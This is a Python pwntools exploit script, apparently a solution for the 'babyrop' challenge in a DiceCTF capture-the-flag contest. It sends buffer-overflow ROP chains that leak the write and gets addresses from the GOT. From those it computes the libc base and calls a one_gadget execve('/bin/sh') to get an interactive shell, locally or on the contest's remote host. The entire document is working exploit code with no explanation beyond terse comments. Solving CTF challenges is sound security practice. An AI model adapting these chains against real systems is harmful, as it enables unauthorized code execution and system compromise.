#!/usr/bin/env python3

from pwn import *
import sys

prompt = b'Your name: '
binary = context.binary = ELF(sys.argv[1])

if not args.REMOTE:
    p = process(binary.path)
else:
    p = remote("dicec.tf", 31924)

print(f"write@plt: {hex(binary.plt.write)}")
print(f"write@got: {hex(binary.got.write)}")
print(f"gets@plt: {hex(binary.plt.gets)}")
print(f"gets@got: {hex(binary.got.gets)}")

p.recvuntil(prompt)

# https://sidsbits.com/Defeating-ASLR-with-a-Leak/
# From ROPgadget
# 0x00000000004011d3 : pop rdi ; ret
pop_rdi = 0x4011d3
# 0x00000000004011d1 : pop rsi ; pop r15 ; ret
pop_rsi_pop_r15 = 0x4011d1

buf = b"A" * 4 * 16

# adc    edx, dword ptr [rbp + 0x48]
buf += p64(0x40203f)
buf += p64(0x40110c)
buf += p64(pop_rdi)

# buf += p64(0x401170)
buf += p64(pop_rdi)
buf += p64(0x1)
buf += p64(pop_rsi_pop_r15)
buf += p64(binary.got.write)
buf += p64(0x0)
buf += p64(binary.plt.write)
buf += p64(binary.sym.main)

p.sendline(buf)

write_leak = u64(p.recv(6).ljust(8, b'\x00'))
print('write leak: ' + hex(write_leak))

p.recvuntil(prompt)

buf = b"A" * 4 * 16

# adc    edx, dword ptr [rbp + 0x48]
buf += p64(0x40203f)
buf += p64(0x40110c)
buf += p64(pop_rdi)

# buf += p64(0x401170)
buf += p64(pop_rdi)
buf += p64(0x1)
buf += p64(pop_rsi_pop_r15)
buf += p64(binary.got.gets)
buf += p64(0x0)
buf += p64(binary.plt.write)
buf += p64(binary.sym.main)

p.sendline(buf)

gets_leak = u64(p.recv(6).ljust(8, b'\x00'))
print('gets leak: ' + hex(gets_leak))

p.recvuntil(prompt)

# https://libc.blukat.me/?q=gets%3A0x7f6be7827af0%2Cwrite%3A0x7f6be78b21d0&l=libc6_2.31-0ubuntu9.1_amd64
#   symbol      offset    diff
# --------------------------------
# - system      0x055410  0x0
# - gets        0x086af0  0x316e0
# - open        0x110e50  0xbba40
# - read        0x111130  0xbbd20
# - write       0x1111d0  0xbbdc0
# - str_bin_sh  0x1b75aa  0x16219a

write_offset = 0x1111d0
system_offset = 0x055410
bin_sh_offset = 0x1b75aa

# one_gadget ~/Downloads/libc6_2.31-0ubuntu9.1_amd64.so
# 0xe6c7e execve("/bin/sh", r15, r12)

# ~/opt/ROPgadget/ROPgadget.py --binary babyrop | vim -
# ~/opt/Ropper/Ropper.py --file babyrop | less
# 0x00000000004011cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12to15 = 0x4011cc
one_gadget_offset = 0xe6c7e

libc_base = write_leak - write_offset
system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset
one_gadget_address = libc_base + one_gadget_offset

buf = b"A" * 4 * 18

buf += p64(pop_r12to15)
buf += p64(0x0)
buf += p64(0x0)
buf += p64(0x0)
buf += p64(0x0)
buf += p64(one_gadget_address)

p.sendline(buf)

p.interactive()
